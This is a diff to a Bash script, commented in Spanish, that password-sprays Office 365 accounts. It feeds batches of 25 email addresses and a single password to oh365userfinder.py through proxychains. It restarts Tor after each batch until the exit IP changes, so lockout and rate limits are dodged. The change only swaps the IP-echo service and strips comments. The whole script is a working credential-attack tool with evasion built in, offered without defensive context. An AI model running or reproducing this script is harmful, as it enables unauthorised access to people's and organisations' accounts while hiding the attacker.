@@ -26,7 +26,7 @@ help(){
 
 
 
-TMP_FILE="/tmp/tmp_mail.$$.tmp" #archivo con correos temporales
+TMP_FILE="/tmp/tmp_mail.$$.tmp" 
 MAIL_FILE="$1"
 PASSWORD="$2"
 
@@ -46,15 +46,15 @@ service tor start
 		
 sleep 3
 
-ip1="$(proxychains curl https://ipecho.net/plain 2>/dev/null)"
+ip1="$(proxychains curl icanhazip.com 2>/dev/null)"
 echo -e "\n${blueColour}[*]${endColour} Mi dirección IP es {$ip1}"
 
 ip2=""
 
 while [ -s "$MAIL_FILE" ]; do
-	#copiando las n primeras lineas al fichero temporal
+
 	head -25 $MAIL_FILE | tee $TMP_FILE >/dev/null 2>&1
-	#echo "------- borrando las n primeras lineas del fichero total"
+	
 	sed -i '1,25d' $MAIL_FILE
 
 	proxychains python3 oh365userfinder.py -p $PASSWORD --pwspray --elist $TMP_FILE 2>/dev/null
@@ -62,12 +62,12 @@ while [ -s "$MAIL_FILE" ]; do
 
 	service tor restart
 	sleep 2
-	ip2="$(proxychains curl https://ipecho.net/plain 2>/dev/null)"
+	ip2="$(proxychains curl icanhazip.com 2>/dev/null)"
 	sleep 1
 	while [ "$ip2" == "$ip1" ] || [ "$ip2" == "" ] ; do
 		service tor restart
 		sleep 2
-		ip2="$(proxychains curl https://ipecho.net/plain 2>/dev/null)"
+		ip2="$(proxychains curl icanhazip.com 2>/dev/null)"
 	done
 
 	echo -e "\n${blueColour}[*]${endColour} Mi Nueva dirección IP es {$ip2}"
